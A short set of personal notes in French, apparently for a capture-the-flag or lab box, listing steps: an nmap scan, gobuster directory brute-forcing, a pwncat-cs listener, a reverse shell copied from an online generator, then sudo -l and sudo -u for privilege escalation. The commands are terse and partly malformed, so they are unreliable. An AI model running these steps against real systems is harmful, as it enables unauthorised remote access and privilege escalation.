
nmap ip
exploiter les shell web

on lance gobuster

```
gobuster dir -w  `fzf-wordlists` -u http://ip
```

on peut chosir le wordlists en tapant juste entré par exemple common

on fait du

```
pwncat-cs : 9999
```

on met dans le site rxonline.cf/ l'addresse  et le port et apres en copier une bash pour voir s'il se passe rien , si le bach ne marche pas on change en python 

```
sudo -l
```

```
sudo -u  utlisateur /bin/bash
```